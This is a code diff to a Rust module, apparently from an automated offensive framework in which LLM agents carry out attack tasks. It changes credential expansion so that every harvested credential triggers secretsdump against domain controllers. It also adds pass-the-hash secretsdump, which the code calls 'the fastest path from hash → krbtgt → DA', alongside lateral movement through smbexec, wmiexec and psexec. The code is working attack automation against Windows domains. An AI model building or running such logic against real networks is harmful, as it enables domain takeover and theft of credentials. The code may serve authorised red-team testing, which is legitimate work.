@@ -2,7 +2,8 @@
 //!
 //! When new credentials arrive, this automation tries lateral movement
 //! (smbexec, wmiexec, psexec) against non-owned hosts. It also tries
-//! secretsdump on DCs with admin-capable credentials.
+//! secretsdump on DCs for ALL credentials (not just admin — the credential
+//! access agent determines feasibility).
 
 use std::sync::Arc;
 use std::time::Duration;
@@ -87,8 +88,6 @@ pub async fn auto_credential_expansion(
         };
 
         for item in work {
-            let mut dispatched = false;
-
             // 1. Try lateral movement on non-DC hosts (up to 5 targets)
             let technique = LATERAL_TECHNIQUES[0]; // Start with smbexec
             for target_ip in item.targets.iter().take(5) {
@@ -103,61 +102,62 @@ pub async fn auto_credential_expansion(
                         username = %item.credential.username,
                         "Credential expansion lateral dispatched"
                     );
-                    dispatched = true;
                 }
             }
 
-            // 2. If admin cred, try secretsdump on DC
-            if item.is_admin {
-                if let Some(ref dc_ip) = item.dc_ip {
-                    let sd_dedup = format!(
-                        "{}:{}:{}",
-                        dc_ip,
-                        item.credential.domain.to_lowercase(),
-                        item.credential.username.to_lowercase()
-                    );
-                    let already_dumped = {
-                        let state = dispatcher.state.read().await;
-                        state.is_processed(DEDUP_SECRETSDUMP, &sd_dedup)
-                    };
+            // 2. Try secretsdump on DC for ALL credentials (not just admin).
+            // Secretsdump requires admin rights but we dispatch speculatively —
+            // the LLM agent will determine if the credential has sufficient privileges.
+            // Admin creds get higher priority (2 vs 5).
+            if let Some(ref dc_ip) = item.dc_ip {
+                let sd_dedup = format!(
+                    "{}:{}:{}",
+                    dc_ip,
+                    item.credential.domain.to_lowercase(),
+                    item.credential.username.to_lowercase()
+                );
+                let already_dumped = {
+                    let state = dispatcher.state.read().await;
+                    state.is_processed(DEDUP_SECRETSDUMP, &sd_dedup)
+                };
 
-                    if !already_dumped {
-                        if let Ok(Some(task_id)) = dispatcher
-                            .request_secretsdump(dc_ip, &item.credential, 2)
+                if !already_dumped {
+                    let priority = if item.is_admin { 2 } else { 5 };
+                    if let Ok(Some(task_id)) = dispatcher
+                        .request_secretsdump(dc_ip, &item.credential, priority)
+                        .await
+                    {
+                        debug!(
+                            task_id = %task_id,
+                            dc = %dc_ip,
+                            is_admin = item.is_admin,
+                            "Credential secretsdump dispatched"
+                        );
+
+                        dispatcher
+                            .state
+                            .write()
                             .await
-                        {
-                            debug!(
-                                task_id = %task_id,
-                                dc = %dc_ip,
-                                "Admin credential secretsdump dispatched"
-                            );
-                            dispatched = true;
-
-                            dispatcher
-                                .state
-                                .write()
-                                .await
-                                .mark_processed(DEDUP_SECRETSDUMP, sd_dedup.clone());
-                            let _ = dispatcher
-                                .state
-                                .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &sd_dedup)
-                                .await;
-                        }
+                            .mark_processed(DEDUP_SECRETSDUMP, sd_dedup.clone());
+                        let _ = dispatcher
+                            .state
+                            .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &sd_dedup)
+                            .await;
                     }
                 }
             }
 
-            if dispatched {
-                dispatcher
-                    .state
-                    .write()
-                    .await
-                    .mark_processed(DEDUP_EXPANSION_CREDS, item.dedup_key.clone());
-                let _ = dispatcher
-                    .state
-                    .persist_dedup(&dispatcher.queue, DEDUP_EXPANSION_CREDS, &item.dedup_key)
-                    .await;
-            }
+            // Always mark as processed — even if throttled/deferred — to prevent
+            // the credential from being retried every 15s and flooding the deferred queue.
+            dispatcher
+                .state
+                .write()
+                .await
+                .mark_processed(DEDUP_EXPANSION_CREDS, item.dedup_key.clone());
+            let _ = dispatcher
+                .state
+                .persist_dedup(&dispatcher.queue, DEDUP_EXPANSION_CREDS, &item.dedup_key)
+                .await;
         }
 
         // 3. Try hashes for pass-the-hash lateral movement
@@ -210,8 +210,6 @@ pub async fn auto_credential_expansion(
         };
 
         for item in hash_work {
-            let mut dispatched = false;
-
             // Build a credential-like object for pass-the-hash
             let pth_cred = ares_core::models::Credential {
                 id: format!("pth_{}", item.hash.username),
@@ -236,21 +234,61 @@ pub async fn auto_credential_expansion(
                         username = %item.hash.username,
                         "Hash-based lateral dispatched"
                     );
-                    dispatched = true;
                 }
             }
 
-            if dispatched {
-                dispatcher
-                    .state
-                    .write()
-                    .await
-                    .mark_processed(DEDUP_HASH_LATERAL, item.dedup_key.clone());
-                let _ = dispatcher
-                    .state
-                    .persist_dedup(&dispatcher.queue, DEDUP_HASH_LATERAL, &item.dedup_key)
-                    .await;
+            // 4. Hash→secretsdump: try pass-the-hash secretsdump against DCs.
+            // This is the fastest path from hash → krbtgt → DA.
+            {
+                let state = dispatcher.state.read().await;
+                let dc_ips: Vec<String> = state.domain_controllers.values().cloned().collect();
+                drop(state);
+
+                for dc_ip in dc_ips {
+                    let sd_dedup = format!(
+                        "{}:{}:{}",
+                        dc_ip,
+                        item.hash.domain.to_lowercase(),
+                        item.hash.username.to_lowercase()
+                    );
+                    let already = {
+                        let state = dispatcher.state.read().await;
+                        state.is_processed(DEDUP_SECRETSDUMP, &sd_dedup)
+                    };
+                    if !already {
+                        if let Ok(Some(task_id)) =
+                            dispatcher.request_secretsdump(&dc_ip, &pth_cred, 2).await
+                        {
+                            debug!(
+                                task_id = %task_id,
+                                dc = %dc_ip,
+                                username = %item.hash.username,
+                                "Hash-based secretsdump dispatched"
+                            );
+                            dispatcher
+                                .state
+                                .write()
+                                .await
+                                .mark_processed(DEDUP_SECRETSDUMP, sd_dedup.clone());
+                            let _ = dispatcher
+                                .state
+                                .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &sd_dedup)
+                                .await;
+                        }
+                    }
+                }
             }
+
+            // Always mark as processed to prevent retry storms.
+            dispatcher
+                .state
+                .write()
+                .await
+                .mark_processed(DEDUP_HASH_LATERAL, item.dedup_key.clone());
+            let _ = dispatcher
+                .state
+                .persist_dedup(&dispatcher.queue, DEDUP_HASH_LATERAL, &item.dedup_key)
+                .await;
         }
     }
 }
